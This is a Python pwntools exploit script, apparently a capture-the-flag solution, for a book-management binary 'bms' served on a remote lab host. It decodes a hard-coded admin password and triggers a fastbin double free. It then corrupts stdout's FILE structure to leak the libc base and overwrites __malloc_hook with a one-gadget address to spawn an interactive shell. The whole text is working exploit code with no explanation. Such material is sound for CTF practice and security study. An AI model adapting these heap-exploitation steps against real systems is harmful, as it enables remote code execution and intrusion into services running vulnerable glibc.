from pwn import *
import sys

if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./bms")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	elf = ELF("./bms")
else:
	p = remote("90b826377a05d5e9508314e76f2f1e4e.kr-lab.com","40001")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
        elf = ELF("./bms")

def login(username,password):
	p.sendafter("username:",username)
	p.sendafter("password:",password)
	p.recvuntil("success login\n")

def add(size,content,name = "aa"):
	p.sendafter(">","1")
	p.sendafter("book name:",name)
	p.sendafter("description size:",str(size))
	p.sendafter("description:",content)

def free(index):
	p.sendafter(">","2")
        p.sendafter("index:",str(index))

def enc1(c):
	info = ord(c)
        if info & 1 == 1:
                return chr(info + 7)
        else:
                return chr(info - 7)

def dec1(c):
	info = ord(c)
	if info & 1 == 1:
		return chr(info + 7)
	else:
		return chr(info - 7)

def enc2(c):
	info = ord(c)
        if info != 0x3B and info != 0x64:
                return chr(info ^ 0x1B)
        else:
                return chr(info)

def dec2(c):
	info = ord(c)
	if info == 0x3B or info == 0x64:
		return chr(info)
	else:
		return chr(info ^ 0x1B)

def decrypt(password):
	length = len(password)
	res = ""
	for i in range(length):
		#temp = dec1(password[i])
		temp = dec2(password[i])
		res += temp
	#print res
	"""
	password = res
	res = ""
        for i in range(length):
                temp = dec2(password[i])
                res += temp"""
        password = res
	return password[::-1]
		

def debugf():
	gdb.attach(p,"b *0x401312")

context.log_level = "debug"
context.terminal = ["tmux","splitw","-h"]
username = "admin\n"
password = "~vzi}"
for i in range(7,255-7):
	assert enc1(chr(i)) == dec1(chr(i))
for i in range(255):
        assert enc2(chr(i)) == dec2(chr(i))
login(username,decrypt(password) + "a")
#debugf()
add(0x60,p64(0)*6 + p64(0x71) + "\xdd\x55") #0
add(0x60,"\x00") #1
free(0)
free(1)
free(0)
#debugf()
add(0x60,"\x68") #2
add(0x60,p64(0xdeadbeea) + p64(0)*2 + p64(0x71)) #3
add(0x60,p64(0xdeadbeeb) + p64(0)*2 + p64(0x71)) #4
add(0x60,p64(0xdeadbeec) + p64(0)*5 + p64(0x31) + p64(0)*2 + "\x60") #5
payload = "\x00\x00\x00" + p64(0) * 6 + p64(0xfbad1800) + p64(0)*3 + "\x00"
add(0x60,payload) #6
p.recv(0x40)
if debug:
	libc.address = u64(p.recv(6).ljust(8,"\x00")) - 0x3c5600
else:
	libc.address = u64(p.recv(6).ljust(8,"\x00")) - 0x3c5600
log.success("libc_base:" + hex(libc.address))
#debugf()
free(1)
free(0)
add(0x68,p64(0)*2 + p64(0) + p64(0x71) + p64(libc.symbols["__malloc_hook"] - 0x23))
add(0x60,p64(0))
if debug:
	payload = "aaa" + p64(0) * 2 + p64(libc.address + 0xf02a4)
else:
	payload = "aaa" + p64(0) * 2 + p64(libc.address + 0xf02a4)
add(0x60,payload)
free(5)
p.interactive()
